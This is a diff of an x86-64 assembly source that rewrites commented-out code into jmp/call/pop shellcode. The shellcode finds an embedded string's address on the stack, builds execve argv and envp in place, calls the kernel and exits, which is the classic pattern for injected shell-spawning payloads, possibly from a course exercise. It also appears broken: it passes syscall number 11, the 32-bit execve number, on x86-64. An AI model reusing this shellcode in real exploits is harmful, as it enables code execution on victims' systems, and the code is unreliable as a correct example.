@@ -13,29 +13,29 @@
         .type   main, @function
 
 main:
-        push    %rbp
-        movq    %rsp, %rbp
+        jmp callptr
 
-        // movq    $SYS_exit, %rax          /* syscall arg 1: SYS_exit (60) */
-        // movq    $0, %rdi                 /* syscall arg 2: 0 */
-        // syscall                         /* invoke syscall */
 
-popladdr:
-//        popq    %rcx
-//        movq    %rcx,(ARGV)(%rcx)       /* set up argv pointer to pathname */
-//        xorq    %rax,%rax               /* get a 64-bit zero value */
-//        movb    %al,(STRLEN)(%rcx)      /* null-terminate our string */
-//        movq    %rax,(ENVP)(%rcx)       /* set up null envp */
+payload:
+        popq    %rcx
+        movq    %rcx, (ARGV)(%rcx)       /* set up argv pointer to pathname */
+        xorq    %rax, %rax               /* get a 64-bit zero value */
+        movq    %rax, (STRLEN)(%rcx)     /* null-terminate our string */
+        movq    %rax, (ENVP)(%rcx)       /* set up null envp */
 
-//        movb    $SYS_execve,%al         /* syscall arg 1: syscall number */
-//        movq    %rcx,%rdi               /* syscall arg 2: string pathname */
-//        leaq    ARGV(%rcx),%rsi         /* syscall arg 2: argv */
-//        leaq    ENVP(%rcx),%rdx         /* syscall arg 3: envp */
-//        syscall                         /* invoke syscall */
+        movq    $11, %rax                /* syscall arg 1: syscall number */
+        movq    %rcx, %rdi               /* syscall arg 2: string pathname */
+        leaq    ARGV(%rcx), %rsi         /* syscall arg 2: argv */
+        leaq    ENVP(%rcx), %rdx         /* syscall arg 3: envp */
+        syscall                          /* invoke syscall */
 
-        movq    $SYS_exit, %rax           /* syscall arg 1: SYS_exit (60) */
-        xorq    %rdi,%rdi               /* syscall arg 2: 0 */
-        syscall                         /* invoke syscall */
+        movq    $SYS_exit, %rax          /* syscall arg 1: SYS_exit (60) */
+        xorq    %rdi,%rdi                /* syscall arg 2: 0 */
+        syscall                          /* invoke syscall */
+
+callptr:
+    call    payload                    /* push STRING ptr to stack */
+    .ascii  STRING
 
 
 .section .data
